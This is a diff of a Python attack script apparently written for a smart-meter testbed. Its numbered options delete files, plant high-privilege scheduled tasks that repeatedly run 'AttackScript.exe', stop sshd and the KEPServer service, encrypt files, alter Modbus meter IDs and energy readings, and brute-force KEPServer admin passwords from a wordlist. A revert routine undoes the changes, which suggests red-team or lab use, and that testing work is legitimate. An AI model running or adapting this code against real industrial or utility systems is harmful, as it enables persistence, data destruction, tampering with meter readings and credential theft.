@@ -96,6 +96,13 @@ def disable_ssh():
         print("Outbound Firewall Failed to be Inserted")
 
     if count == 4:
+        service_name = "sshd"
+        cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
+        output = cp.stdout.decode('utf-8').strip().split()
+        if "FAILED" in cp.stdout.decode('utf-8'):
+                print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
+        else:
+            print("The " + output[1] + " service is " + output[9])
         print("Firewall Rules added successfully.\nOk.\n")
     else:
         print("Firewall Rules failed to add.\nFail.\n")
@@ -103,16 +110,6 @@ def disable_ssh():
 #Disable Kepserver Service
 def disable_kepserver():
     service_name = "KEPServerEXV6"
-    cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
-    output = cp.stdout.decode('utf-8').strip().split()
-    if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-    else:
-        print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
-
-#Disable sshd Service
-def disable_sshd():
-    service_name = "sshd"
     cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
     output = cp.stdout.decode('utf-8').strip().split()
     if "FAILED" in cp.stdout.decode('utf-8'):
@@ -218,17 +215,21 @@ def Create_Share_folder():
 
 #Create Scheduled Task for deleting files
 def Create_scheduled_task():
-    executable_file_path = r'C:\\Windows\\temp\\Smartmetertest\\AttackScript.exe' #Help me change this
+    executable_file_path = r'C:/Windows/temp/SmartMetertest/AttackScript.exe' #Help me change this
 
     executable_file_parameters = '1'
 
-    task_name = 'Smart Meter Testing'
+    task_name1 = 'Smart Meter Testing'
     task_name2 = 'Smart Meter Testing 2'
-    sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 5'
-    sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon'
 
-    subprocess.call(sch1, shell=True)
-    subprocess.call(sch2, shell=True)
+    sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
+    sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
+
+    
+    schtaskschk = run(['schtasks', '/query', '/tn', '\"'+task_name1+'\"'], stdout=PIPE, stderr=PIPE, text=True)
+    if "ERROR" not in schtaskschk.stdout:
+        call(sch1, shell=True)
+        call(sch2, shell=True)
 
 def encrypt_Files():
     #public key
@@ -365,7 +366,6 @@ def changeMeterID():
         print("Fail.\n")
 
 
-
 def clearEnergyReading():
 
     netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
@@ -380,9 +380,6 @@ def clearEnergyReading():
             print("The " + output[1] + " service is " + output[9])
             sleep(15)
 
-
-    
-
     current_directory = getcwd()
     executable_path = current_directory + "\\modpoll.exe"
     checkEnergy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-c", "11", "-1", "-r", "26", "COM1"]
@@ -391,7 +388,19 @@ def clearEnergyReading():
         check_call([executable_path] + checkEnergy)
         check_call([executable_path] + clearEnergy)
         check_call([executable_path] + checkEnergy)
-        print("Energy Reading Cleared.\nOk.\n")
+
+        print("Energy Reading Cleared.")
+
+        service_name = "KEPServerEXV6"
+        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
+        output = cp.stdout.decode('utf-8').strip().split()
+        if "FAILED" in cp.stdout.decode('utf-8'):
+            print("FAILED: " + " ".join(output[4:]))
+            print("Fail.\n")
+        else:
+            print("The " + output[1] + " service is " + output[9])
+
+        print("\nOk.\n")
     except CalledProcessError as e:
         print("Error executing the executable file:", e)
         print("Fail.\n")
@@ -416,30 +425,28 @@ def bruteForceKEP():
             print("The " + output[1] + " service is " + output[9])
             sleep(15)
 
-    
-
-    print("Username: Administrator\n")
+    usernames = ["Admin", "Administrator"]
     passwords = ["michael", "superman" , "7777777", "administrator2022" , "johnsnow"]
     success = 0
 
-    for password in passwords:
-        print("Trying: " + password)
-        # Read and print each line in the file
-        try:
-            server = kepconfig.connection.server(host = '127.0.0.1', port = 57412, user = 'Administrator', pw = password)
-            output = server.get_project_properties()
-            with open(copiedpath + "\\KEPServerProperties.txt", "w") as f:
-                f.write(str(output))
-            print("Success.\nOk.\n")
-            success = 1
-            break
-        except Exception as e:
-            print("Failed.\n")
-            continue
+    for username in usernames:
+        for password in passwords:
+            print("Trying Username: " + username +", Trying Password: " + password)
+            # Read and print each line in the file
+            try:
+                server = kepconfig.connection.server(host = '127.0.0.1', port = 57412, user = username, pw = password)
+                output = server.get_project_properties()
+                with open(copiedpath + "\\KEPServerProperties.txt", "w") as f:
+                    f.write(str(output))
+                print("Success! Username: " + username + ", Password: " + password + "\nOk.\n")
+                success = 1
+                break
+            except Exception as e:
+                print("Failed.\n")
+                continue
 
     if success == 0:
         print("\nFail.")
-
 
 def revert(revertoption):
     # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
@@ -477,7 +484,16 @@ def revert(revertoption):
         else:
             print("Outbound Firewall Not Removed (UDP/22)")
 
-        if count == 4:
+        service_name = "sshd"
+        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
+        output = cp.stdout.decode('utf-8').strip().split()
+        if "FAILED" in cp.stdout.decode('utf-8'):
+                print("FAILED: " + " ".join(output[4:]))
+        else:
+            print("The " + output[1] + " service is " + output[9])
+            count += 1
+
+        if count == 5:
             print("Revert Success.\nOk.\n")
         else:
             print("Revert Fail.\nFail.\n")
@@ -621,21 +637,29 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
                 og = path.join(root, file)
                 remove(og)
                 print("File: " + str(og) + " is deleted")
-        rmdir(copiedpath)
-        system('cmd /k "net share SmartMeterfolder /delete"')
 
-        schtaskschk = run(['schtasks', '/query'], stdout=PIPE, stderr=PIPE, text=True)
-        if "Smart Meter Testing" in schtaskschk.stdout:
-            task_name = 'Smart Meter Testing'
-            task_name2 = 'Smart Meter Testing 2'
+        if path.exists(copiedpath):
+            rmdir(copiedpath)
+            print(copiedpath + " has beeen removed.")
 
+        netsharechk = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
+
+        if "SmartMeterfolder" in netsharechk.stdout:
+            call('cmd /k "net share SmartMeterfolder /delete"', shell=True)
+
+        task_name1 = 'Smart Meter Testing'
+        task_name2 = 'Smart Meter Testing 2'
+
+        schtaskschk = run(['schtasks', '/query', '/tn', '\"'+task_name1+'\"'], stdout=PIPE, stderr=PIPE, text=True)
+        if "ERROR" not in schtaskschk.stdout:
+            
             # Define the command to delete the task using schtasks
-            schdel = f'schtasks /delete /tn "{task_name}" /f'
-            schdel2 = f'schtasks /delete /tn "{task_name}" /f'
+            schdel = f'schtasks /delete /tn "{task_name1}" /f'
+            schdel2 = f'schtasks /delete /tn "{task_name2}" /f'
 
             # Delete the task using the schtasks command
-            subprocess.call(schdel, shell=True)
-            subprocess.call(schdel2, shell=True)
+            call(schdel, shell=True)
+            call(schdel2, shell=True)
 
         print("Ok.")
 
@@ -664,7 +688,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
         output = cp.stdout.decode('utf-8').strip().split()
         if "FAILED" in cp.stdout.decode('utf-8'):
-                print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
+                print("FAILED: " + " ".join(output[4:]))
         else:
             print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
 
@@ -808,7 +832,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         except Exception as e:
             print("Decryption Failed")
 
-        # Remove copied file, directory and shared file
+        # Remove copied file, directory, shared file and Scheduled Task
         print("\n==================================\n")
         
         for root, dirs, files in walk(copiedpath):
@@ -816,43 +840,53 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
                 og = path.join(root, file)
                 remove(og)
                 print("File: " + str(og) + " is deleted")
-        try:
+
+
+        if path.exists(copiedpath):
             rmdir(copiedpath)
-            print("Directory: " + str(copiedpath) + " is deleted")
-            system('cmd /k "net share SmartMeterfolder /delete"')
-            print("Success")
-        except Exception as e:
-            print("File not found.")
+            print(copiedpath + " has beeen removed.")
+
+        netsharechk = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
+
+        if "SmartMeterfolder" in netsharechk.stdout:
+            call('cmd /k "net share SmartMeterfolder /delete"', shell=True)
+
+        task_name1 = 'Smart Meter Testing'
+        task_name2 = 'Smart Meter Testing 2'
+
+        schtaskschk = run(['schtasks', '/query', '/tn', '\"'+task_name1+'\"'], stdout=PIPE, stderr=PIPE, text=True)
+        if "ERROR" not in schtaskschk.stdout:
+            
+            # Define the command to delete the task using schtasks
+            schdel = f'schtasks /delete /tn "{task_name1}" /f'
+            schdel2 = f'schtasks /delete /tn "{task_name2}" /f'
+
+            # Delete the task using the schtasks command
+            call(schdel, shell=True)
+            call(schdel2, shell=True)
 
         print("\n==================================\n")
 
         print("Reverting successfull.\nOk.\n")
 
-    elif revertoption == "10":
-
-        service_name = "sshd"
-        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-                print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
-
-
     elif revertoption == "-h":
-        print("\n Choose: \n1 Enable firewall, \n2 Re-enable ssh through firewall, \n3 Re-enable kepserver service, \n4 Re-enable COM port, \n5 Decrypt encrypted files, \n6 Change meter25 id back, \n7 Kill Modpoll, \n8 Remove shared folder and Scheduled Task,\n9 Revert Everything, \n10 Re-enable sshd service.")
+        print("\n Choose: \n1 Enable firewall, \n2 Re-enable ssh through firewall, \n3 Re-enable kepserver service, \n4 Re-enable COM port, \n5 Decrypt encrypted files, \n6 Change meter25 id back, \n7 Kill Modpoll, \n8 Remove shared folder and Scheduled Task,\n9 Revert Everything.")
     else:
         print ("Invalid Option! Use option \"-h\" for help!")
 
 if __name__ == '__main__':
-    check_admin()
     attackoption = str(argv[1])
+    if attackoption != "1":
+        check_admin()
+
     if attackoption == "1":
         try:
             delete_files(smartmeterpath)
-            Create_scheduled_task()
+            if windll.shell32.IsUserAnAdmin():
+                Create_scheduled_task()
             print("\nOk.\n")
         except Exception as e:
+            print(e)
             print("\nFail.\n")
     elif attackoption == "2":
         try:
@@ -883,7 +917,7 @@ if __name__ == '__main__':
     elif attackoption == "12":
         bruteForceKEP()
     elif attackoption == "-h":
-        print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password.")
+        print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service.")
 
     else:
         print ("Invalid Option! Use option \"-h\" for help!")
